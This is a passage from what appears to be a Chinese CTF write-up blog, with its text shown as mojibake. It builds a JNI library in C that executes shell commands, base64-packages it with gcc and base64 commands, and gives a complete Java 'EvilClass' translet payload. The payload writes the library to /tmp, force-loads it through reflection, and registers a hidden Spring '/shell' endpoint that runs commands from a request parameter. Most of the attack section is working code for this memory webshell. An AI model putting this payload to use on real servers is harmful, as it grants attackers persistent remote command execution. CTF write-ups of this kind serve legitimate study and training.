<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javah -jni EvilClass</span><br><span class="line">    </span><br></pre></td></tr></tbody></table></figure>
<p>ç”Ÿæˆçš„ EvilClass.h å¦‚ä¸‹</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* DO NOT EDIT THIS FILE - it is machine generated */</span></span><br><span class="line">#include &lt;jni.h&gt;</span><br><span class="line"><span class="comment">/* Header for class EvilClass */</span></span><br><span class="line"></span><br><span class="line">#ifndef _Included_EvilClass</span><br><span class="line">#define _Included_EvilClass</span><br><span class="line">#ifdef __cplusplus</span><br><span class="line">extern <span class="string">"C"</span> {</span><br><span class="line">#endif</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Class:     EvilClass</span></span><br><span class="line"><span class="comment"> * Method:    execCmd</span></span><br><span class="line"><span class="comment"> * Signature: (Ljava/lang/String;)Ljava/lang/String;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">JNIEXPORT jstring JNICALL <span class="title function_">Java_EvilClass_execCmd</span></span><br><span class="line">  <span class="params">(JNIEnv *, jclass, jstring)</span>;</span><br><span class="line"></span><br><span class="line">#ifdef __cplusplus</span><br><span class="line">}</span><br><span class="line">#endif</span><br><span class="line">#endif</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>æ¥ä¸‹æ¥è¿˜è¦æ ¹æ®è¿™ä¸ª h æ–‡ä»¶å†™ C æ–‡ä»¶ï¼ŒnmğŸ‘´ä¸ä¼š c</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">execmd</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *cmd, <span class="type">char</span> *result)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">1024</span>*<span class="number">12</span>];              <span class="comment">//å®šä¹‰ç¼“å†²åŒº</span></span><br><span class="line">    FILE *pipe = popen(cmd, <span class="string">"r"</span>); <span class="comment">//æ‰“å¼€ç®¡é“ï¼Œå¹¶æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">    <span class="keyword">if</span> (!pipe)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">//è¿”å›0è¡¨ç¤ºè¿è¡Œå¤±è´¥</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!feof(pipe))</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (fgets(buffer, <span class="number">128</span>, pipe))</span><br><span class="line">        { <span class="comment">//å°†ç®¡é“è¾“å‡ºåˆ°resultä¸­</span></span><br><span class="line">            <span class="built_in">strcat</span>(result, buffer);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    pclose(pipe); <span class="comment">//å…³é—­ç®¡é“</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;      <span class="comment">//è¿”å›1è¡¨ç¤ºè¿è¡ŒæˆåŠŸ</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>è¿™é‡Œå¼€å¯äº†ä¸€ä¸ªç¼“å†²åŒºï¼Œ <code>popen</code>  æ˜¯ C ä¸­æ‰§è¡Œå‘½ä»¤æ—¶æ‰“å¼€çš„ä¸€ä¸ªç®¡é“ï¼Œä»¥åªè¯»æ¨¡å¼æ‰“å¼€ã€‚å¦‚æœä¸ºç©ºï¼Œåˆ™å‘½ä»¤æ‰§è¡Œå¤±è´¥ï¼Œè¿”å›.</p>
<p>åŒæ—¶ while ä½¿ç”¨ feof æ£€æµ‹ pipe çŠ¶æ€ï¼Œæœªç»“æŸå°±æŒç»­ä» pipe é‡Œé¢æ¯æ¬¡æœ€å¤§è·å– 128 ä¸ªå­—èŠ‚å†…å®¹ï¼Œæ”¾åˆ°ç¼“å†²åŒºï¼Œç„¶åå°†ç»“æœè¿½åŠ åˆ° <code>result</code>  ä¸­.</p>
<p>éšå</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">JNIEXPORT jstring JNICALL <span class="title function_">Java_EvilClass_execCmd</span><span class="params">(JNIEnv *env, jclass class_object, jstring jstr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *cstr = (*env)-&gt;GetStringUTFChars(env, jstr, <span class="literal">NULL</span>); <span class="comment">// è·å– Java å­—ç¬¦ä¸² jstr çš„ UTF-8 ç¼–ç </span></span><br><span class="line">    <span class="type">char</span> result[<span class="number">1024</span> * <span class="number">12</span>] = <span class="string">""</span>; <span class="comment">// å®šä¹‰ä¸€ä¸ªå­˜æ”¾å‘½ä»¤æ‰§è¡Œç»“æœçš„å­—ç¬¦æ•°ç»„</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span> == execmd(cstr, result)) <span class="comment">// è°ƒç”¨ä¹‹å‰å®šä¹‰çš„ execmd å‡½æ•°æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</span></span><br><span class="line">    {</span><br><span class="line">        <span class="comment">// å¦‚æœå‘½ä»¤æ‰§è¡ŒæˆåŠŸï¼Œä½ å¯ä»¥åœ¨è¿™é‡Œè¿›è¡Œä¸€äº›å¤„ç†ï¼Œä½†ä»£ç ä¸­è¢«æ³¨é‡Šæ‰äº†</span></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> return_messge[<span class="number">100</span>] = <span class="string">""</span>; <span class="comment">// å®šä¹‰ä¸€ä¸ªå­˜æ”¾è¿”å›æ¶ˆæ¯çš„å­—ç¬¦æ•°ç»„</span></span><br><span class="line">    <span class="built_in">strcat</span>(return_messge, result); <span class="comment">// å°†å‘½ä»¤æ‰§è¡Œç»“æœè¿½åŠ åˆ°è¿”å›æ¶ˆæ¯</span></span><br><span class="line"></span><br><span class="line">    jstring cmdresult = (*env)-&gt;NewStringUTF(env, return_messge); <span class="comment">// åˆ›å»ºä¸€ä¸ª Java å­—ç¬¦ä¸²ï¼Œç”¨äºå­˜å‚¨è¿”å›æ¶ˆæ¯</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cmdresult; <span class="comment">// è¿”å› Java å­—ç¬¦ä¸²ï¼ŒåŒ…å«å‘½ä»¤æ‰§è¡Œç»“æœ</span></span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h3 id="jni-è§„èŒƒ"><a class="markdownIt-Anchor" href="#jniè§„èŒƒ">#</a> JNI è§„èŒƒ</h3>
<p><strong>JNI åŸå‹å‡½æ•°ï¼š</strong> JNI è§„èŒƒå®šä¹‰äº†ä¸€ç»„æ ‡å‡†çš„ JNI å‡½æ•°åŸå‹ï¼Œå¦‚ <code>GetStringUTFChars</code> ã€ <code>ReleaseStringUTFChars</code>  ç­‰ï¼Œä»¥æ–¹ä¾¿æ“ä½œå­—ç¬¦ä¸²ã€æ•°ç»„ã€å¼•ç”¨ç­‰å¸¸è§ä»»åŠ¡ã€‚</p>
<p><strong>JNI å‡½æ•°å‘½åè§„èŒƒï¼š</strong> JNI å‡½æ•°çš„å‘½åå¿…é¡»éµå¾ªç‰¹å®šçš„å‘½åè§„èŒƒï¼Œé€šå¸¸æ˜¯ Java ç±»åï¼ˆç”¨ä¸‹åˆ’çº¿æ›¿ä»£ç‚¹å·ï¼‰åè·Ÿ Java æ–¹æ³•åã€‚ä¾‹å¦‚ï¼ŒJava ç±» <code>com.example.MyClass</code>  ä¸­çš„æ–¹æ³• <code>myNativeFunction</code>  å¯¹åº”çš„ JNI å‡½æ•°åº”ä¸º <code>Java_com_example_MyClass_myNativeFunction</code> ã€‚</p>
<p><strong>JNIEnv æŒ‡é’ˆï¼š</strong> JNI å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ª <code>JNIEnv</code>  æŒ‡é’ˆï¼Œå®ƒæ˜¯ä¸€ä¸ªå…³äº JNI ç¯å¢ƒçš„ä¸Šä¸‹æ–‡ã€‚é€šè¿‡ <code>JNIEnv</code> ï¼ŒJNI å‡½æ•°å¯ä»¥è®¿é—® Java è™šæ‹Ÿæœºçš„å„ç§åŠŸèƒ½ï¼Œå¦‚å¯¹è±¡åˆ›å»ºã€æ–¹æ³•è°ƒç”¨å’Œå¼‚å¸¸å¤„ç†ã€‚</p>
<p><strong>æ•°æ®ç±»å‹è½¬æ¢ï¼š</strong> JNI å®šä¹‰äº†å„ç§æ•°æ®ç±»å‹çš„å¯¹åº”å…³ç³»ï¼Œä»¥ä¾¿ Java å’Œæœ¬åœ°ä»£ç ä¹‹é—´çš„æ•°æ®ä¼ é€’ã€‚ä¾‹å¦‚ï¼ŒJava çš„ <code>int</code>  å¯¹åº” JNI çš„ <code>jint</code> ï¼ŒJava çš„ <code>String</code>  å¯¹åº” JNI çš„ <code>jstring</code>  ç­‰ã€‚JNI å‡½æ•°å…è®¸åœ¨è¿™äº›æ•°æ®ç±»å‹ä¹‹é—´è¿›è¡Œè½¬æ¢ã€‚</p>
<p>ä»å‚æ•°ä¸Šçœ‹ï¼šå®ƒæ¥å—ä¸‰ä¸ªå‚æ•°ï¼š <code>JNIEnv *env</code> ï¼ˆJNI ç¯å¢ƒæŒ‡é’ˆï¼‰ã€ <code>jclass class_object</code> ï¼ˆè¡¨ç¤º Java ç±»çš„ç±»å¯¹è±¡ï¼‰ã€ <code>jstring jstr</code> ï¼ˆä¸€ä¸ª Java å­—ç¬¦ä¸²ï¼‰ã€‚</p>
<p>é€šè¿‡  <code>(*env)-&gt;GetStringUTFChars</code>  å‡½æ•°å°† Java å­—ç¬¦ä¸²  <code>jstr</code>  è½¬æ¢ä¸º C å­—ç¬¦ä¸²  <code>cstr</code> ï¼Œè¿™æ˜¯å› ä¸º  <code>execmd</code>  å‡½æ•°éœ€è¦æ¥å— C å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ã€‚</p>
<p>ä¸­é—´æ‰§è¡Œå‘½ä»¤ï¼Œå­˜å‚¨.</p>
<p>ä½¿ç”¨  <code>(*env)-&gt;NewStringUTF</code>  å‡½æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„ Java å­—ç¬¦ä¸²  <code>cmdresult</code> ï¼Œç”¨äºå­˜å‚¨è¿”å›æ¶ˆæ¯ã€‚</p>
<p>å°†ä¸¤éƒ¨åˆ†æ”¾åœ¨ä¸€èµ·ï¼Œå½¢æˆ c æ–‡ä»¶ï¼Œç„¶åç¼–è¯‘</p>
<p>ç¼–è¯‘:</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -FPIC -I /home/siroha/java8202/include -I /home/siroha/java8202/include/linux -shared -o libcmd.so ./EvilClass.c</span><br><span class="line">base64 -w <span class="number">0</span> libcmd.so &gt; Evil.txt</span><br></pre></td></tr></tbody></table></figure>
<p>å†™æ–‡ä»¶çš„æ“ä½œ</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RandomAccessFile randomAccessFile = new RandomAccessFile(LIB_PATH, <span class="string">"rw"</span>);</span><br><span class="line">            randomAccessFile.write(jniBytes);</span><br><span class="line">            randomAccessFile.close();</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>æœ€ç»ˆå†™ä¸ª load çš„å†…å­˜ğŸ</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line">import org.springframework.web.context.WebApplicationContext;</span><br><span class="line">import org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line">import org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line">import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.RandomAccessFile;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.Base64;</span><br><span class="line">import java.util.Vector;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">EvilClass</span> <span class="title">extends</span> <span class="title">AbstractTranslet</span> {</span></span><br><span class="line">    public <span class="type">static</span> native String <span class="title function_">execCmd</span><span class="params">(String cmd)</span>;</span><br><span class="line">    private <span class="type">static</span> final String EVIL_JNI_BASE64 = <span class="string">""</span>;<span class="comment">//ğŸ‘´å°±ä¸æ”¾åœ¨è¿™é‡Œäº†,å¤ªé•¿äº†,è‡ªå·±ç”Ÿæˆ</span></span><br><span class="line">    private <span class="type">static</span> final String LIB_PATH = <span class="string">"/tmp/libcmd.so"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> {</span><br><span class="line"></span><br><span class="line">        try{</span><br><span class="line">            byte[] jniBytes = Base64.getDecoder().decode(EVIL_JNI_BASE64);</span><br><span class="line">            RandomAccessFile randomAccessFile = new RandomAccessFile(LIB_PATH, <span class="string">"rw"</span>);</span><br><span class="line">            randomAccessFile.write(jniBytes);</span><br><span class="line">            randomAccessFile.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">//è°ƒç”¨java.lang.ClassLoader$NativeLibraryç±»çš„loadæ–¹æ³•åŠ è½½åŠ¨æ€é“¾æ¥åº“</span></span><br><span class="line">            ClassLoader cmdLoader = EvilClass.class.getClassLoader();</span><br><span class="line">            Class&lt;?&gt; classLoaderClazz = Class.forName(<span class="string">"java.lang.ClassLoader"</span>);</span><br><span class="line">            Class&lt;?&gt; nativeLibraryClazz = Class.forName(<span class="string">"java.lang.ClassLoader$NativeLibrary"</span>);</span><br><span class="line">            Method load = nativeLibraryClazz.getDeclaredMethod(<span class="string">"load"</span>, String.class, boolean.class);</span><br><span class="line"></span><br><span class="line">            load.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            Field field = classLoaderClazz.getDeclaredField(<span class="string">"nativeLibraries"</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            Vector&lt;Object&gt; libs = (Vector&lt;Object&gt;) field.get(cmdLoader);</span><br><span class="line">            Constructor&lt;?&gt; nativeLibraryCons = nativeLibraryClazz.getDeclaredConstructor(Class.class, String.class, boolean.class);</span><br><span class="line">            nativeLibraryCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            Object nativeLibraryObj = nativeLibraryCons.newInstance(EvilClass.class, LIB_PATH, <span class="literal">false</span>);</span><br><span class="line">            libs.addElement(nativeLibraryObj);</span><br><span class="line">            field.<span class="built_in">set</span>(cmdLoader, libs);</span><br><span class="line">            load.invoke(nativeLibraryObj, LIB_PATH, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//å†™å…¥å†…å­˜é©¬</span></span><br><span class="line">            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">"org.springframework.web.servlet.DispatcherServlet.CONTEXT"</span>, <span class="number">0</span>);</span><br><span class="line">            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">            Field configField = mappingHandlerMapping.getClass().getDeclaredField(<span class="string">"config"</span>);</span><br><span class="line">            configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            RequestMappingInfo.BuilderConfiguration config =</span><br><span class="line">                    (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);</span><br><span class="line">            Method method2 = EvilClass.class.getMethod(<span class="string">"shell"</span>, HttpServletRequest.class, HttpServletResponse.class);</span><br><span class="line">            RequestMappingInfo info = RequestMappingInfo.paths(<span class="string">"/shell"</span>)</span><br><span class="line">                    .options(config)</span><br><span class="line">                    .build();</span><br><span class="line">            EvilClass springControllerMemShell = new EvilClass();</span><br><span class="line">            mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        }catch (Exception e){</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    public <span class="type">void</span> <span class="title function_">shell</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> throws IOException {</span><br><span class="line"></span><br><span class="line">        String cmd = request.getParameter(<span class="string">"cmd"</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != null) {</span><br><span class="line">            String execRes = EvilClass.execCmd(cmd);</span><br><span class="line">            response.getWriter().write(execRes);</span><br><span class="line">            response.getWriter().flush();</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public <span class="type">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> throws TransletException {</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public <span class="type">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> throws TransletException {</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p><code>NativeLibrary</code>  åŒ…è£…åˆ° Vector,Vector æ˜¯ <code>Classloader</code>  ä¸­ <code>nativeLibraries</code>  çš„å€¼ï¼Œ</p>
<p>ä¸€èˆ¬æ¥è¯´ç”¨</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">System.loadLibrary(<span class="string">"cmd"</span>);</span><br><span class="line">        Command command = new Command();</span><br><span class="line">        String ipconfig = command.exec(<span class="string">"ipconfig"</span>);</span><br><span class="line">        System.out.println(ipconfig);</span><br></pre></td></tr></tbody></table></figure>
<p>é¢˜ç›® ban äº†.</p>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231106155628.png" alt="å¾®ä¿¡æˆªå›¾_20231106155628"></p>
<p>èŠœæ¹–ï¼ŒçœŸâˆšâ…§ çˆ½ï¼Œâˆšâ…§ çœŸçˆ½ï¼Œç»ˆå‡ºäº†.</p>
<p>æéº»éº»åœ°ï¼ŒğŸ‘´èŠ±äº†å‡ å¤©æ—¶é—´ï¼Œå­¦äº†ä¸€å †ä¸œè¥¿.</p>
<p>æ€ä¹ˆåˆ¶ä½œé“¾å­ï¼Œæ€ä¹ˆ python å‘åŒ…ï¼ŒğŸ‘´åœ¨å‰é¢å·²ç»åˆ†æè¿‡äº†ã€‚ä¸ç”¨é—®äº†ğŸ˜…</p>

      </section>

      
      
        <nav class="article-nav">
          
            <div class="article-nav-item layout-padding">
  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
    
    <div class="card-text">
      
        <a href="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/" itemprop="url">
          <h2 class="card-text--title text-ellipsis">N1CTF_å¤ç°</h2>
        </a>
      
      <div class="card-text--row">Newer</div>
    </div>
  </article>
</div>
          
          
        </nav>
      

      <section class="page-message-container layout-padding">
        


  
  

  
  


      </section>
    </div>
    <div class="widget-info">
      <section class="widget-author widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
  <div class="widget-body">
    
      <img src="https://raw.githubusercontent.com/1llustrious/img/main/avatar1.jpg" class="soft-size--round soft-style--box" alt="1llustrious">
    
    
      <h2>1llustrious</h2>
    
    
      <p>æ²¡æœ‰æœªæ¥çš„æœªæ¥,ä¸æ˜¯æˆ‘æƒ³è¦çš„æœªæ¥</p>
    

    <div class="count-box">
      <div class="count-box--item">
        <svg class="icon icon-article" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M240.51564747 647.74217627h196.07203239c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806V165.10332731c0-33.18142087-30.16492806-60.32985613-60.32985612-60.32985611H245.04038668C225.43318342 104.7734712 210.35071939 119.85593522 210.35071939 139.46313845V617.57724821c0 16.59071043 13.57421762 30.16492806 30.16492808 30.16492806z m663.62841731-452.47392089v482.63884894c0 33.18142087-27.14843525 60.32985613-60.32985612 60.32985613H180.18579134c-33.18142087 0-60.32985613-27.14843525-60.32985612-60.32985613V195.26825538c-49.77213131 0-90.49478418 40.72265287-90.49478417 90.49478417v452.4739209c0 49.77213131 40.72265287 90.49478418 90.49478417 90.49478417h286.56681657c16.59071043 0 30.16492806 13.57421762 30.16492807 30.16492807s13.57421762 30.16492806 30.16492805 30.16492806h90.49478418c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806s13.57421762-30.16492806 30.16492807-30.16492807h286.56681657c49.77213131 0 90.49478418-40.72265287 90.49478417-90.49478417V285.76303955c0-49.77213131-40.72265287-90.49478418-90.49478417-90.49478417zM587.41232014 647.74217627h191.54729318c19.60720323 0 34.68966726-15.08246403 34.68966729-34.68966727V134.93839925c0-16.59071043-13.57421762-30.16492806-30.16492808-30.16492805H617.57724821c-30.16492806 0-60.32985613 27.14843525-60.32985612 60.32985611v452.4739209c0 16.59071043 13.57421762 30.16492806 30.16492805 30.16492806z" fill="currentColor"></path>
</svg>
        <span>3</span>
      </div>
      <div class="count-box--item">
        <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
</svg>
        0
      </div>
      <div class="count-box--item">
        <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
</svg>
        2
      </div>
    </div>
  </div>
</section>

      
<section class="widget-toc widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
  <div class="widget-title">
    <svg class="icon icon-toc" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M134.50666666 767.46666668H460.8c27.73333333 0 50.24000001 22.50666668 50.24000001 50.23999999v50.13333333c0 27.73333333-22.50666668 50.24000001-50.24000001 50.24000001H134.50666666c-27.73333333 0-50.24000001-22.50666668-50.23999999-50.24000001v-50.13333333c0.10666668-27.73333333 22.50666668-50.24000001 50.24000001-50.24000001zM84.37333332 541.65333333h326.18666669c27.73333333 0 50.24000001 22.39999999 50.23999999 50.13333334v50.24000001c0 27.73333333-22.50666668 50.24000001-50.24000002 50.23999999H84.37333332c-27.73333333 0-50.24000001-22.50666668-50.23999999-50.23999999v-50.24000001c0-27.73333333 22.50666668-50.13333334 50.24000001-50.13333334zM134.50666666 315.83999999H460.8c27.73333333 0 50.24000001 22.50666668 50.24000001 50.24000001v50.24000001c0 27.73333333-22.50666668 50.13333334-50.24000001 50.13333333H134.50666666c-27.73333333 0-50.24000001-22.39999999-50.23999999-50.13333333v-50.24000001c0.10666668-27.84000001 22.50666668-50.24000001 50.24000001-50.23999999zM209.81333332 89.91999999h326.18666671c27.73333333 0 50.24000001 22.39999999 50.23999997 50.13333335v50.23999999c0 27.73333333-22.50666668 50.24000001-50.24000001 50.24000001H209.81333332c-27.73333333 0-50.24000001-22.50666668-50.23999999-50.24000001v-50.24000001c0-27.73333333 22.50666668-50.13333334 50.24000001-50.13333333zM692.05333333 623.36l274.66666669 176.00000002c23.36000001 14.93333333 30.08 45.97333334 15.14666666 69.33333332L954.77333334 910.93333333c-14.93333333 